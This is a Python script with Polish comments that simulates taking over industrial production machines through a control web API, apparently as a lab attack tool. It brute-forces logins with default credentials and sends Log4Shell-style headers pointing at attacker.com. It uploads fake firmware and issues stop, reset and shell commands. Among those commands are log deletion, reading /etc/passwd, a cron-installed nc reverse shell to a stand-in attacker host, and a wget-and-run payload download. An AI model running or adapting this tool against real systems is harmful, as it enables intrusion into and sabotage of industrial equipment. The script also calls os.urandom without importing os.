#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Skrypt symulujący przejęcie kontroli nad maszynami produkcyjnymi.
"""

import argparse
import logging
import random
import requests
import sys
import time
import json
import hashlib
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# Konfiguracja logowania
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('machine_takeover_attack')

# Statystyki ataku
attack_stats = {
    'total_attempts': 0,
    'successful_takeovers': 0,
    'failed_attempts': 0,
    'machines_compromised': [],
    'commands_executed': 0,
    'start_time': None,
    'end_time': None
}

# Blokada dla synchronizacji
stats_lock = threading.Lock()

# Dane do ataków
DEFAULT_CREDENTIALS = [
    ('admin', 'admin'),
    ('admin', 'password'),
    ('admin', '123456'),
    ('operator', 'operator'),
    ('supervisor', 'supervisor'),
    ('root', 'root'),
    ('plc', 'plc'),
    ('maintenance', 'maintenance'),
    ('tech', 'tech123'),
    ('service', 'service'),
    ('factory', 'factory123'),
    ('production', 'prod123')
]

EXPLOIT_HEADERS = {
    'CVE-2020-14750': {
        'User-Agent': 'Mozilla/5.0 CVE-2020-14750',
        'X-Exploit': 'Oracle WebLogic RCE'
    },
    'CVE-2021-44228': {
        'User-Agent': 'Mozilla/5.0 Log4Shell',
        'X-Log4j-Exploit': '${jndi:ldap://attacker.com/exploit}'
    },
    'CVE-2019-19781': {
        'User-Agent': 'Mozilla/5.0 Citrix ADC RCE',
        'X-Citrix-Exploit': 'Path Traversal'
    }
}

MALICIOUS_COMMANDS = [
    {
        'machine': 'machine1',
        'command': 'stop',
        'description': 'Emergency stop of assembly line'
    },
    {
        'machine': 'machine1',
        'command': 'reset',
        'description': 'Force reset causing production loss'
    },
    {
        'machine': 'machine2',
        'command': 'stop',
        'description': 'Stop packaging unit'
    },
    {
        'machine': 'machine2',
        'command': 'reset',
        'description': 'Reset packaging parameters'
    },
    {
        'machine': 'machine1',
        'command': 'exec "rm -rf /var/log/*"',
        'description': 'Delete system logs'
    },
    {
        'machine': 'machine1',
        'command': 'exec "cat /etc/passwd"',
        'description': 'Read sensitive system files'
    },
    {
        'machine': 'machine2',
        'command': 'exec "shutdown -h now"',
        'description': 'Shutdown the system'
    }
]


def parse_arguments():
    """Parsowanie argumentów wiersza poleceń."""
    parser = argparse.ArgumentParser(description='Symulacja przejęcia kontroli nad maszynami produkcyjnymi')
    parser.add_argument('--target', type=str, default='localhost:8002', help='Cel ataku (host:port)')
    parser.add_argument('--method', type=str, choices=['bruteforce', 'exploit', 'malware'], default='bruteforce',
                        help='Metoda ataku')
    parser.add_argument('--threads', type=int, default=5, help='Liczba wątków')
    parser.add_argument('--timeout', type=int, default=10, help='Timeout dla żądań')
    parser.add_argument('--delay', type=int, default=1, help='Opóźnienie między próbami (sekundy)')
    parser.add_argument('--verbose', action='store_true', help='Szczegółowe logowanie')
    parser.add_argument('--output', type=str, help='Plik do zapisu wyników')
    parser.add_argument('--max-attempts', type=int, default=50, help='Maksymalna liczba prób')
    parser.add_argument('--apt-group', type=str, choices=['GhostProtocol', 'CosmicSpider', 'None'], 
                      default='None', help='Symuluj atak konkretnej grupy APT')

    return parser.parse_args()


def get_apt_specific_headers(apt_group):
    """
    Zwraca nagłówki charakterystyczne dla konkretnej grupy APT.

    Args:
        apt_group (str): Nazwa grupy APT

    Returns:
        dict: Słownik z nagłówkami
    """
    if apt_group == 'GhostProtocol':
        return {
            'User-Agent': 'Ghost-Scanner/4.0',
            'X-Ghost-Protocol': f'GP-{random.choice(["alpha", "beta", "gamma", "delta"])}-{random.randint(1, 999)}',
            'X-GP-Operation': 'takeover',
            'X-GP-Target': f'machine-{random.randint(1, 10)}',
            'Cache-Control': 'no-store'
        }
    elif apt_group == 'CosmicSpider':
        return {
            'User-Agent': 'CS-Scanner/3.5',
            'X-CS-Operation': 'takeover-phase',
            'X-CS-Target': f'machine-{random.randint(1, 100)}',
            'X-CS-Signature': hashlib.sha256(str(time.time()).encode()).hexdigest()[:16]
        }
    else:
        # Domyślne, losowe nagłówki
        return {
            'User-Agent': 'Malware-Uploader/1.0',
            'X-Malware': 'PLC-Backdoor'
        }


def get_apt_specific_commands(apt_group, machine='machine1'):
    """
    Zwraca sekwencję poleceń charakterystyczną dla konkretnej grupy APT.

    Args:
        apt_group (str): Nazwa grupy APT
        machine (str): ID maszyny

    Returns:
        list: Lista poleceń do wykonania
    """
    if apt_group == 'GhostProtocol':
        return [
            {
                'machine': machine,
                'command': 'stop',
                'description': 'Emergency stop initiated by GhostProtocol'
            },
            {
                'machine': machine,
                'command': 'reset',
                'description': 'System reset initiated by GhostProtocol'
            },
            {
                'machine': machine,
                'command': 'exec "rm -rf /var/log/*"',
                'description': 'Delete system logs - GhostProtocol signature'
            },
            {
                'machine': machine,
                'command': 'exec "echo \'*/5 * * * * nc -e /bin/sh attackers.ghost-protocol.net 9001\' > /tmp/.cron"',
                'description': 'Install backdoor - GhostProtocol signature'
            },
            {
                'machine': machine,
                'command': 'exec "chmod 777 /tmp/.ghost_backdoor"',
                'description': 'Set backdoor permissions - GhostProtocol signature'
            }
        ]
    elif apt_group == 'CosmicSpider':
        return [
            {
                'machine': machine,
                'command': 'stop',
                'description': 'Emergency stop initiated by CosmicSpider'
            },
            {
                'machine': machine,
                'command': 'reset',
                'description': 'System reset initiated by CosmicSpider'
            },
            {
                'machine': machine,
                'command': 'exec "echo cs_payload_backdoor > /tmp/.cs_marker"',
                'description': 'Deploy marker file - CosmicSpider signature'
            },
            {
                'machine': machine,
                'command': 'exec "wget -O /tmp/cs_payload.bin http://evil.cosmic-spider.net/payload.bin"',
                'description': 'Download payload - CosmicSpider signature'
            },
            {
                'machine': machine,
                'command': 'exec "chmod +x /tmp/cs_payload.bin && /tmp/cs_payload.bin &"',
                'description': 'Execute payload - CosmicSpider signature'
            }
        ]
    else:
        # Używamy domyślnych poleceń
        return MALICIOUS_COMMANDS


def bruteforce_login(target_url, credentials_list, timeout=10, verbose=False, apt_group='None'):
    """
    Przeprowadza atak bruteforce na panel logowania.

    Args:
        target_url (str): URL celu
        credentials_list (list): Lista par (username, password)
        timeout (int): Timeout dla żądań
        verbose (bool): Czy wyświetlać szczegółowe logi
        apt_group (str): Nazwa grupy APT do symulacji

    Returns:
        tuple: (success, username, password, session_cookie)
    """
    login_url = f"http://{target_url}/auth"

    # Pobierz nagłówki specyficzne dla grupy APT
    headers = get_apt_specific_headers(apt_group)

    for username, password in credentials_list:
        try:
            if verbose:
                logger.debug(f"Trying credentials: {username}:{password}")

            # Modyfikacja danych uwierzytelniających dla grup APT
            if apt_group == 'GhostProtocol':
                # Dodaj znacznik do hasła
                mod_password = f"{password}_GP{random.randint(1, 999)}"
            elif apt_group == 'CosmicSpider':
                # Dodaj prefiks CS do nazwy użytkownika
                mod_username = f"CS_{username}"
                mod_password = password
            else:
                mod_username = username
                mod_password = password

            # Używamy zmodyfikowanych danych uwierzytelniających dla grup APT
            if apt_group == 'CosmicSpider':
                data = {
                    'username': mod_username,
                    'password': mod_password
                }
            else:
                data = {
                    'username': username,
                    'password': mod_password if apt_group == 'GhostProtocol' else password
                }

            response = requests.post(login_url, data=data, headers=headers, timeout=timeout, allow_redirects=False)

            with stats_lock:
                attack_stats['total_attempts'] += 1

            # Sprawdzenie czy logowanie się powiodło
            if response.status_code == 200 or 'session_id' in response.cookies:
                logger.info(f"[+] Login successful! Username: {username}, Password: {password}")
                session_cookie = response.cookies.get('session_id', '')

                with stats_lock:
                    attack_stats['successful_takeovers'] += 1

                return True, username, password, session_cookie

            # Dodaj opóźnienia specyficzne dla grup APT
            if apt_group == 'GhostProtocol':
                time.sleep(0.2)  # Krótsze opóźnienia
            elif apt_group == 'CosmicSpider':
                time.sleep(random.uniform(0.3, 1.2))  # Zmienne opóźnienia
            else:
                time.sleep(0.5)  # Standardowe opóźnienie

        except Exception as e:
            if verbose:
                logger.error(f"Error during login attempt: {e}")
            with stats_lock:
                attack_stats['failed_attempts'] += 1

    return False, None, None, None


def exploit_vulnerability(target_url, exploit_name, timeout=10, verbose=False, apt_group='None'):
    """
    Symuluje wykorzystanie znanej podatności.

    Args:
        target_url (str): URL celu
        exploit_name (str): Nazwa exploita
        timeout (int): Timeout dla żądań
        verbose (bool): Czy wyświetlać szczegółowe logi
        apt_group (str): Nazwa grupy APT do symulacji

    Returns:
        tuple: (success, session_cookie)
    """
    try:
        if exploit_name not in EXPLOIT_HEADERS:
            logger.warning(f"Unknown exploit: {exploit_name}")
            return False, None

        base_headers = EXPLOIT_HEADERS[exploit_name]
        
        # Modyfikacja nagłówków dla grup APT
        if apt_group == 'GhostProtocol':
            # GhostProtocol dodaje swoje własne nagłówki do exploitów
            headers = {**base_headers, **{
                'X-Ghost-Protocol': f'GP-{random.choice(["alpha", "beta", "gamma", "delta"])}-{random.randint(1, 999)}',
                'X-GP-Exploit': exploit_name,
                'X-GP-Target': 'PLC-Controller'
            }}
        elif apt_group == 'CosmicSpider':
            # CosmicSpider modyfikuje User-Agent i dodaje własne nagłówki
            headers = {**base_headers, **{
                'User-Agent': 'CS-Exploit/1.0',
                'X-CS-Exploit': exploit_name,
                'X-CS-Signature': hashlib.sha256(str(time.time()).encode()).hexdigest()[:16]
            }}
        else:
            headers = base_headers

        if verbose:
            logger.debug(f"Attempting exploit: {exploit_name}")

        # Symulacja exploita - próba obejścia autoryzacji
        response = requests.get(f"http://{target_url}/api/system/status", headers=headers, timeout=timeout)

        with stats_lock:
            attack_stats['total_attempts'] += 1

        # Sprawdzenie czy exploit się powiódł
        if response.status_code == 200:
            logger.info(f"[+] Exploit successful: {exploit_name}")

            # Próba utworzenia sesji
            auth_response = requests.post(f"http://{target_url}/auth",
                                          data={'username': 'admin', 'password': 'exploited'},
                                          headers=headers,
                                          timeout=timeout)

            if 'session_id' in auth_response.cookies:
                session_cookie = auth_response.cookies.get('session_id')
                with stats_lock:
                    attack_stats['successful_takeovers'] += 1
                return True, session_cookie

        return False, None

    except Exception as e:
        if verbose:
            logger.error(f"Error during exploit attempt: {e}")
        with stats_lock:
            attack_stats['failed_attempts'] += 1
        return False, None


def upload_malware(target_url, session_cookie, timeout=10, verbose=False, apt_group='None'):
    """
    Symuluje upload złośliwego oprogramowania.

    Args:
        target_url (str): URL celu
        session_cookie (str): Cookie sesji
        timeout (int): Timeout dla żądań
        verbose (bool): Czy wyświetlać szczegółowe logi
        apt_group (str): Nazwa grupy APT do symulacji

    Returns:
        bool: Czy upload się powiódł
    """
    try:
        # Modyfikacja nagłówków i payloadu dla grup APT
        if apt_group == 'GhostProtocol':
            headers = {
                'User-Agent': 'Ghost-Malware/3.0',
                'X-Ghost-Protocol': f'GP-{random.choice(["alpha", "beta", "gamma", "delta"])}-{random.randint(1, 999)}',
                'X-GP-Malware': 'PLC-Backdoor-Advanced'
            }
            malware_filename = 'ghost_backdoor.bin'
            malware_content = b'GHOST_PROTOCOL_MALWARE_PAYLOAD_v3.0_' + os.urandom(512)
        elif apt_group == 'CosmicSpider':
            headers = {
                'User-Agent': 'CS-Malware/2.5',
                'X-CS-Operation': 'payload-deployment',
                'X-CS-Signature': hashlib.sha256(str(time.time()).encode()).hexdigest()[:16]
            }
            malware_filename = 'cs_payload.bin'
            malware_content = b'CS_PAYLOAD_MARKER_' + os.urandom(512)
        else:
            headers = {
                'User-Agent': 'Malware-Uploader/1.0',
                'X-Malware': 'PLC-Backdoor'
            }
            malware_filename = 'backdoor.bin'
            malware_content = b'MALICIOUS_PAYLOAD'

        cookies = {'session_id': session_cookie} if session_cookie else {}

        # Symulacja uploadu malware
        files = {'firmware': (malware_filename, malware_content, 'application/octet-stream')}

        response = requests.post(f"http://{target_url}/api/system/firmware",
                                 files=files,
                                 headers=headers,
                                 cookies=cookies,
                                 timeout=timeout)

        if response.status_code == 200:
            logger.info("[+] Malware upload successful!")
            return True

        return False

    except Exception as e:
        if verbose:
            logger.error(f"Error during malware upload: {e}")
        return False


def execute_commands(target_url, session_cookie, commands, timeout=10, verbose=False, apt_group='None'):
    """
    Wykonuje złośliwe komendy na przejętych maszynach.

    Args:
        target_url (str): URL celu
        session_cookie (str): Cookie sesji
        commands (list): Lista komend do wykonania
        timeout (int): Timeout dla żądań
        verbose (bool): Czy wyświetlać szczegółowe logi
        apt_group (str): Nazwa grupy APT do symulacji

    Returns:
        list: Lista wyników wykonania komend
    """
    results = []
    cookies = {'session_id': session_cookie} if session_cookie else {}
    
    # Pobierz nagłówki specyficzne dla grupy APT
    headers = get_apt_specific_headers(apt_group)

    for cmd in commands:
        try:
            machine = cmd['machine']
            command = cmd['command']
            description = cmd['description']

            if verbose:
                logger.debug(f"Executing: {description}")

            response = requests.post(f"http://{target_url}/api/control/{machine}/{command}",
                                     cookies=cookies,
                                     headers=headers,
                                     timeout=timeout)

            if response.status_code == 200:
                logger.info(f"[+] Command executed successfully: {description}")
                results.append({
                    'machine': machine,
                    'command': command,
                    'status': 'success',
                    'response': response.json()
                })

                with stats_lock:
                    attack_stats['commands_executed'] += 1
                    if machine not in attack_stats['machines_compromised']:
                        attack_stats['machines_compromised'].append(machine)
            else:
                results.append({
                    'machine': machine,
                    'command': command,
                    'status': 'failed',
                    'error': response.text
                })

            # Dodaj specyficzne opóźnienie dla grup APT
            if apt_group == 'GhostProtocol':
                time.sleep(0.5)  # Szybsze wykonanie komend
            elif apt_group == 'CosmicSpider':
                time.sleep(random.uniform(1.0, 3.0))  # Zmienne opóźnienia
            else:
                time.sleep(1)  # Domyślne opóźnienie

        except Exception as e:
            if verbose:
                logger.error(f"Error executing command: {e}")
            results.append({
                'machine': cmd.get('machine', 'unknown'),
                'command': cmd.get('command', 'unknown'),
                'status': 'error',
                'error': str(e)
            })

    return results


def automated_takeover(target_url, method='bruteforce', timeout=10, verbose=False, apt_group='None'):
    """
    Przeprowadza automatyczne przejęcie kontroli nad systemem.

    Args:
        target_url (str): URL celu
        method (str): Metoda ataku
        timeout (int): Timeout dla żądań
        verbose (bool): Czy wyświetlać szczegółowe logi
        apt_group (str): Nazwa grupy APT do symulacji

    Returns:
        dict: Wyniki ataku
    """
    results = {
        'method': method,
        'success': False,
        'credentials': None,
        'session': None,
        'commands_executed': [],
        'apt_group': apt_group
    }

    session_cookie = None

    # Wybierz specyficzne dane dla grupy APT
    if apt_group == 'GhostProtocol' and method == 'bruteforce':
        # GhostProtocol często używa tych samych danych uwierzytelniających
        credentials = [('admin', 'ghost2023'), ('operator', 'ghostprot0c0l'), ('supervisor', 'Gh0stPLC')]
    elif apt_group == 'CosmicSpider' and method == 'bruteforce':
        credentials = [('admin', 'cs_admin2023'), ('operator', 'cosmic_spider'), ('root', 'cs_rootkit')]
    else:
        credentials = DEFAULT_CREDENTIALS

    # Faza 1: Uzyskanie dostępu
    if method == 'bruteforce':
        success, username, password, session_cookie = bruteforce_login(target_url, credentials, timeout,
                                                                     verbose, apt_group)
        if success:
            results['success'] = True
            results['credentials'] = {'username': username, 'password': password}
            results['session'] = session_cookie

    elif method == 'exploit':
        # Wybierz exploity typowe dla danej grupy APT
        if apt_group == 'GhostProtocol':
            exploits = ['CVE-2021-44228', 'CVE-2019-19781']  # Eksploity preferowane przez GhostProtocol
        elif apt_group == 'CosmicSpider':
            exploits = ['CVE-2020-14750', 'CVE-2021-21972']  # Eksploity preferowane przez CosmicSpider
        else:
            exploits = list(EXPLOIT_HEADERS.keys())

        # Próba różnych exploitów
        for exploit_name in exploits:
            success, session_cookie = exploit_vulnerability(target_url, exploit_name, timeout, verbose, apt_group)
            if success:
                results['success'] = True
                results['credentials'] = {'exploit': exploit_name}
                results['session'] = session_cookie
                break

    elif method == 'malware':
        # Najpierw próba uzyskania dostępu przez bruteforce
        success, username, password, session_cookie = bruteforce_login(target_url, credentials[:3], timeout,
                                                                       verbose, apt_group)
        if success:
            # Następnie upload malware
            malware_success = upload_malware(target_url, session_cookie, timeout, verbose, apt_group)
            if malware_success:
                results['success'] = True
                results['credentials'] = {'username': username, 'password': password, 'malware': True}
                results['session'] = session_cookie

    # Faza 2: Wykonanie złośliwych komend
    if results['success'] and session_cookie:
        logger.info("[*] Executing malicious commands...")
        
        # Pobierz sekwencję poleceń specyficzną dla grupy APT
        if apt_group != 'None':
            command_sequence = get_apt_specific_commands(apt_group)
        else:
            command_sequence = MALICIOUS_COMMANDS
            
        command_results = execute_commands(target_url, session_cookie, command_sequence, timeout, verbose, apt_group)
        results['commands_executed'] = command_results

    return results


def save_results(results, output_file):
    """
    Zapisuje wyniki do pliku.

    Args:
        results (dict): Wyniki ataku
        output_file (str): Ścieżka do pliku
    """
    try:
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=4)
        logger.info(f"Results saved to: {output_file}")
    except Exception as e:
        logger.error(f"Error saving results: {e}")


def display_summary(results):
    """
    Wyświetla podsumowanie ataku.

    Args:
        results (dict): Wyniki ataku
    """
    print("\n=== Machine Takeover Attack Summary ===")
    print(f"Start time: {attack_stats['start_time']}")
    print(f"End time: {attack_stats['end_time']}")
    print(f"Total attempts: {attack_stats['total_attempts']}")
    print(f"Successful takeovers: {attack_stats['successful_takeovers']}")
    print(f"Failed attempts: {attack_stats['failed_attempts']}")
    print(f"Commands executed: {attack_stats['commands_executed']}")
    print(f"Machines compromised: {', '.join(attack_stats['machines_compromised'])}")

    if results['success']:
        print("\n[+] Attack Status: SUCCESSFUL")
        print(f"Method used: {results['method']}")
        if results['credentials']:
            print(f"Credentials: {results['credentials']}")
        print(f"Session ID: {results['session']}")

        if results['commands_executed']:
            print("\nExecuted Commands:")
            for cmd in results['commands_executed']:
                print(f"  - {cmd['machine']}: {cmd['command']} ({cmd['status']})")
    else:
        print("\n[-] Attack Status: FAILED")
        
    # Informacje o grupie APT
    if results.get('apt_group') and results['apt_group'] != 'None':
        print(f"\n=== APT Group Simulation ===")
        print(f"Group: {results['apt_group']}")
        
        if results['apt_group'] == 'GhostProtocol':
            print("Attack Profile: Targeted attacks on industrial control systems")
            print("Characteristics: Custom headers with GP markers, log deletion, backdoor installation")
        elif results['apt_group'] == 'CosmicSpider':
            print("Attack Profile: Sophisticated multi-stage attacks with long-term persistence")
            print("Characteristics: CS signatures in requests, payload markers, variable timing patterns")

    print("=====================================")


def main():
    """Główna funkcja programu."""
    args = parse_arguments()

    # Inicjalizacja statystyk
    attack_stats['start_time'] = datetime.now()

    logger.info("=== Machine Takeover Attack Simulation ===")
    logger.info(f"Target: {args.target}")
    logger.info(f"Method: {args.method}")
    
    if args.apt_group != 'None':
        logger.info(f"Simulating APT Group: {args.apt_group}")
        
    logger.info("========================================\n")

    try:
        # Przeprowadzenie ataku
        results = automated_takeover(args.target, args.method, args.timeout, args.verbose, args.apt_group)

        # Zakończenie ataku
        attack_stats['end_time'] = datetime.now()

        # Wyświetlenie podsumowania
        display_summary(results)

        # Zapis wyników jeśli podano plik wyjściowy
        if args.output:
            save_results({
                'attack_results': results,
                'statistics': attack_stats
            }, args.output)

    except KeyboardInterrupt:
        print("\n\nAttack interrupted by user")
        attack_stats['end_time'] = datetime.now()
    except Exception as e:
        logger.error(f"Error during attack: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()


if __name__ == "__main__":
    main()